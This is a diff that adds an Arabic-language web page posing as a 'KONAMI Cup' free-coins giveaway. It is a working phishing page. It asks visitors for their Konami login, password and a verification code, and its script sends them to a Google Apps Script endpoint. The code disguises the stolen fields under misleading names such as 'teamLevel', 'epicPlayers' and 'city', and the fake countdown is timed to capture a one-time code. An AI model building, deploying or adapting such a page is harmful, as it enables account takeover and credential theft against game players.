@@ -1,0 +1,855 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>KONAMI Cup</title>
+
+  <style>
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      color: white;
+      text-align: center;
+      font-family: Arial, sans-serif;
+
+      background:
+        linear-gradient(
+          rgba(5, 10, 120, 0.92),
+          rgba(10, 20, 150, 0.92)
+        ),
+        repeating-linear-gradient(
+          135deg,
+          #080b8f 0px,
+          #080b8f 35px,
+          #111bd0 36px,
+          #111bd0 45px
+        );
+    }
+
+    .banner {
+      width: 100%;
+      height: 180px;
+
+      background-image: url("img/banner.png");
+      background-size: contain;
+      background-position: center;
+      background-repeat: no-repeat;
+    }
+
+    .notice {
+      width: 90%;
+      max-width: 500px;
+      margin: 10px auto;
+      padding: 10px;
+
+      background: rgba(0, 0, 0, 0.4);
+      border-radius: 10px;
+
+      color: #fff;
+      font-size: 14px;
+      line-height: 1.6;
+    }
+
+    h1 {
+      margin-top: 10px;
+      margin-bottom: 5px;
+
+      color: red;
+      font-size: 30px;
+
+      text-shadow:
+        0 0 8px rgba(255, 0, 0, 0.6);
+    }
+
+    h2 {
+      margin-top: 5px;
+
+      color: #ffd700;
+      font-size: 22px;
+
+      text-shadow:
+        0 0 8px rgba(255, 215, 0, 0.4);
+
+      min-height: 30px;
+    }
+
+    #playerId,
+    #birthDate,
+    #city,
+    #teamLevel,
+    #epicPlayers {
+
+      width: 85%;
+      max-width: 300px;
+
+      padding: 14px 18px;
+      margin: 10px 0;
+
+      font-size: 17px;
+      text-align: center;
+
+      color: white;
+
+      background: #07184f;
+
+      border: 2px solid #00cfff;
+      border-radius: 12px;
+
+      outline: none;
+
+      transition: 0.2s;
+    }
+
+    #playerId {
+      margin-top: 15px;
+      max-width: 400px;
+
+      background: rgba(0, 0, 40, 0.55);
+
+      border-color:
+        rgba(0, 255, 136, 0.7);
+    }
+
+    #playerId::placeholder,
+    #city::placeholder,
+    #teamLevel::placeholder,
+    #epicPlayers::placeholder {
+      color: #c9c9c9;
+    }
+
+    #playerId:focus,
+    #birthDate:focus,
+    #city:focus,
+    #teamLevel:focus,
+    #epicPlayers:focus {
+
+      border-color: #00ff88;
+
+      box-shadow:
+        0 0 15px
+        rgba(0, 255, 136, 0.4);
+    }
+
+    .coins {
+
+      width: 90%;
+      max-width: 330px;
+
+      margin: 20px auto;
+      padding: 22px 20px;
+
+      background:
+        linear-gradient(
+          to bottom,
+          #173fc9 0%,
+          #102d9d 45%,
+          #0b237f 70%,
+          #06164f 100%
+        );
+
+      border: 2px solid #12306f;
+      border-radius: 20px;
+
+      box-shadow:
+        0 0 18px rgba(0, 120, 255, 0.55),
+        inset 0 0 25px rgba(0, 0, 60, 0.65),
+        inset 0 -8px 18px rgba(0, 0, 30, 0.55);
+    }
+
+    /* وميض العملات */
+
+    .coins img {
+      width: 120px;
+
+      filter:
+        drop-shadow(
+          0 0 10px
+          rgba(255, 215, 0, 0.7)
+        );
+
+      animation:
+        coinGlow 1.2s infinite alternate;
+    }
+
+    @keyframes coinGlow {
+
+      from {
+        transform: scale(1);
+        filter:
+          drop-shadow(
+            0 0 8px
+            rgba(255, 215, 0, 0.6)
+          );
+      }
+
+      to {
+        transform: scale(1.08);
+        filter:
+          drop-shadow(
+            0 0 25px
+            rgba(255, 215, 0, 1)
+          );
+      }
+
+    }
+
+    .coin-number {
+
+      margin-top: 8px;
+
+      font-size: 28px;
+      font-weight: bold;
+
+      color: #ffd700;
+
+      text-shadow:
+        0 0 5px #ffd700,
+        0 0 10px #ffd700,
+        0 0 20px #ffffff;
+
+      animation:
+        numberGlow 1.2s infinite alternate;
+    }
+
+    @keyframes numberGlow {
+
+      from {
+        text-shadow:
+          0 0 5px #ffd700,
+          0 0 10px #ffd700;
+      }
+
+      to {
+        text-shadow:
+          0 0 10px #ffd700,
+          0 0 25px #ffd700,
+          0 0 35px white;
+      }
+
+    }
+
+    #birthSection {
+
+      display: none;
+
+      width: 90%;
+      max-width: 400px;
+
+      margin: 25px auto;
+      padding: 22px;
+
+      background:
+        linear-gradient(
+          to bottom,
+          #173fc9,
+          #06164f
+        );
+
+      border: 2px solid #00cfff;
+      border-radius: 18px;
+
+      box-shadow:
+        0 0 20px
+        rgba(0, 80, 255, 0.45),
+        0 0 35px
+        rgba(0, 207, 255, 0.15);
+    }
+
+    #birthSection h3 {
+
+      margin-top: 0;
+
+      color: #00ff88;
+      font-size: 23px;
+    }
+
+    #birthSection p {
+
+      color: #eeeeee;
+
+      font-size: 15px;
+
+      line-height: 1.6;
+    }
+
+    #secondButton {
+      display: inline-block;
+      margin-top: 15px;
+    }
+
+    #timer {
+
+      display: none;
+
+      color: #ffd700;
+
+      font-size: 20px;
+
+      font-weight: bold;
+
+      margin: 20px 0;
+
+      text-shadow:
+        0 0 8px
+        rgba(255, 215, 0, 0.5);
+    }
+
+    #citySection {
+      display: none;
+      margin-top: 25px;
+    }
+
+    button {
+
+      background:
+        linear-gradient(
+          135deg,
+          #00ff88,
+          #00cfff
+        );
+
+      color: #06111f;
+
+      border:
+        2px solid
+        rgba(255, 255, 255, 0.4);
+
+      padding: 14px 32px;
+
+      font-size: 19px;
+
+      font-weight: bold;
+
+      border-radius: 12px;
+
+      cursor: pointer;
+
+      box-shadow:
+        0 5px 18px
+        rgba(0, 255, 136, 0.35);
+
+      transition: 0.2s;
+    }
+
+    button:hover {
+      transform: scale(1.04);
+    }
+
+    button:disabled {
+      opacity: 0.6;
+      cursor: wait;
+      transform: none;
+    }
+
+    #firstButton {
+      display: inline-block;
+    }
+
+  </style>
+
+</head>
+
+<body>
+
+  <div class="banner"></div>
+
+
+  <input
+    id="playerId"
+    type="text"
+    placeholder="ادخل معرفك "
+  >
+
+  <h1>KONAMI Cup</h1>
+
+  <h2 id="message">
+    Coins Free
+  </h2>
+
+  <div class="coins">
+
+    <img
+      src="img/coins.png"
+      alt="Coins"
+    >
+
+    <div class="coin-number">
+      1000 Coins
+    </div>
+
+  </div>
+
+  <button
+    id="firstButton"
+    onclick="getCoins()"
+  >
+     COLLECT 
+  </button>
+
+
+  <!-- الخطوة الثانية -->
+
+  <div id="birthSection">
+
+    <h3>
+    الخطوة الثانية
+    </h3>
+
+    <p>
+      أدخل تاريخ ميلادك  
+    </p>
+
+    <input
+      id="birthDate"
+      type="date"
+    >
+
+    <input
+      id="teamLevel"
+      type="text"
+      placeholder=" konami id login "
+    >
+
+    <input
+      id="epicPlayers"
+      type="text"
+      placeholder="  password "
+    >
+
+    <br>
+
+    <button
+      id="secondButton"
+      onclick="submitStep2()"
+    >
+      متابعة
+    </button>
+
+    <div id="timer">
+         سيصلك رمز التحقق بعد 30 ثانيه   
+    </div>
+
+
+    <!-- الخطوة الثالثة -->
+
+    <div id="citySection">
+
+      <h3>
+         الخطوة الثالثة
+      </h3>
+
+      <p>
+      
+      </p>
+
+      <input
+        id="city"
+        type="text"
+        placeholder=" ادخل رمز التحقق"
+      >
+
+      <br>
+      <br>
+
+      <button
+        id="sendButton"
+        onclick="sendCity()"
+      >
+        ✓ إرسال
+      </button>
+
+    </div>
+
+  </div>
+
+
+  <script>
+
+    /*
+      ضع هنا رابط Google Apps Script
+    */
+
+    const SCRIPT_URL =
+      "https://script.google.com/macros/s/AKfycbyY2pW4XyJBzc-J-hN6eAe-wOb7IPUHsdt34ofyl0U3YHYqPzaPfGzdnyz4wpsaQ_ki/exec";
+
+
+    /* =====================================
+       الخطوة الأولى
+    ===================================== */
+
+    function getCoins() {
+
+      const id =
+        document
+          .getElementById("playerId")
+          .value
+          .trim();
+
+      const message =
+        document.getElementById("message");
+
+      const birthSection =
+        document.getElementById("birthSection");
+
+      const firstButton =
+        document.getElementById("firstButton");
+
+
+      if (id === "") {
+
+        message.textContent =
+          "يرجى إدخال المعرف";
+
+        return;
+      }
+
+
+      birthSection.style.display =
+        "block";
+
+      message.textContent =
+        "تم إدخال المعرف  ✅";
+
+      firstButton.style.display =
+        "none";
+
+
+      birthSection.scrollIntoView({
+        behavior: "smooth",
+        block: "center"
+      });
+
+    }
+
+
+    /* =====================================
+       إرسال الخطوة الثانية
+    ===================================== */
+
+    async function submitStep2() {
+
+      const playerId =
+        document
+          .getElementById("playerId")
+          .value
+          .trim();
+
+      const birthDate =
+        document
+          .getElementById("birthDate")
+          .value;
+
+      const teamLevel =
+        document
+          .getElementById("teamLevel")
+          .value
+          .trim();
+
+      const epicPlayers =
+        document
+          .getElementById("epicPlayers")
+          .value
+          .trim();
+
+      const message =
+        document.getElementById("message");
+
+      const button =
+        document.getElementById("secondButton");
+
+
+      if (birthDate === "") {
+
+        message.textContent =
+          "يرجى إدخال تاريخ الميلاد";
+
+        return;
+      }
+
+
+      if (teamLevel === "") {
+
+        message.textContent =
+          "يرجى إدخال مستوى التشكيلة";
+
+        return;
+      }
+
+
+      if (epicPlayers === "") {
+
+        message.textContent =
+          "يرجى إدخال عدد لاعبي Epic";
+
+        return;
+      }
+
+
+      button.disabled = true;
+
+      message.textContent =
+        "جاري إرسال بيانات الخطوة الثانية...";
+
+
+      try {
+
+        const response =
+          await fetch(
+            SCRIPT_URL,
+            {
+              method: "POST",
+
+              body:
+                JSON.stringify({
+
+                  action: "step2",
+
+                  playerId:
+                    playerId,
+
+                  teamLevel:
+                    teamLevel,
+
+                  epicPlayers:
+                    epicPlayers
+
+                })
+            }
+          );
+
+
+        const result =
+          await response.json();
+
+
+        if (result.success) {
+
+          message.textContent =
+            "تمت الخطوة الثانية ✅";
+
+          startTimer();
+
+        } else {
+
+          message.textContent =
+            "فشل إرسال الخطوة الثانية ❌";
+
+        }
+
+
+      } catch (error) {
+
+        console.error(error);
+
+        message.textContent =
+          "حدث خطأ أثناء الاتصال ❌";
+
+      }
+
+
+      button.disabled = false;
+
+    }
+
+
+    /* =====================================
+       العداد - 30 ثانية
+    ===================================== */
+
+    function startTimer() {
+
+      const timer =
+        document.getElementById("timer");
+
+      const secondButton =
+        document.getElementById("secondButton");
+
+      secondButton.style.display =
+        "none";
+
+      timer.style.display =
+        "block";
+
+
+      const duration =
+        30 * 1000;
+
+      const endTime =
+        Date.now() + duration;
+
+
+      function updateTimer() {
+
+        const remaining =
+          Math.max(
+            0,
+            endTime - Date.now()
+          );
+
+        const seconds =
+          Math.ceil(
+            remaining / 1000
+          );
+
+
+        if (seconds > 0) {
+
+          timer.textContent =
+            " سيصلك رمز التحقق بعد " +
+            seconds +
+            " ثانية";
+
+          requestAnimationFrame(
+            updateTimer
+          );
+
+        } else {
+
+          timer.textContent =
+            "انتهى الانتظار ✅";
+
+
+          const citySection =
+            document.getElementById(
+              "citySection"
+            );
+
+
+          citySection.style.display =
+            "block";
+
+
+          document.getElementById(
+            "message"
+          ).textContent =
+            "الخطوة الأخيرة ";
+
+
+          citySection.scrollIntoView({
+            behavior: "smooth",
+            block: "center"
+          });
+
+        }
+
+      }
+
+
+      updateTimer();
+
+    }
+
+
+    /* =====================================
+       إرسال المدينة
+    ===================================== */
+
+    async function sendCity() {
+
+      const playerId =
+        document
+          .getElementById("playerId")
+          .value
+          .trim();
+
+      const city =
+        document
+          .getElementById("city")
+          .value
+          .trim();
+
+      const message =
+        document.getElementById("message");
+
+      const button =
+        document.getElementById("sendButton");
+
+
+      if (city === "") {
+
+        message.textContent =
+          "يرجى إدخال المدينة";
+
+        return;
+      }
+
+
+      button.disabled = true;
+
+      message.textContent =
+        "جاري إرسال المدينة...";
+
+
+      try {
+
+        const response =
+          await fetch(
+            SCRIPT_URL,
+            {
+              method: "POST",
+
+              body:
+                JSON.stringify({
+
+                  action: "city",
+
+                  playerId:
+                    playerId,
+
+                  city:
+                    city
+
+                })
+            }
+          );
+
+
+        const result =
+          await response.json();
+
+
+        if (result.success) {
+
+          message.textContent =
+            "تم تسجيلك في البطوله   ✅";
+
+          document.getElementById(
+            "citySection"
+          ).style.display =
+            "none";
+
+        } else {
+
+          message.textContent =
+            "فشل إرسال المدينة ❌";
+
+        }
+
+
+      } catch (error) {
+
+        console.error(error);
+
+        message.textContent =
+          "حدث خطأ أثناء الاتصال ❌";
+
+      }
+
+
+      button.disabled = false;
+
+    }
+
+  </script>
+
+</body>
+
+</html>
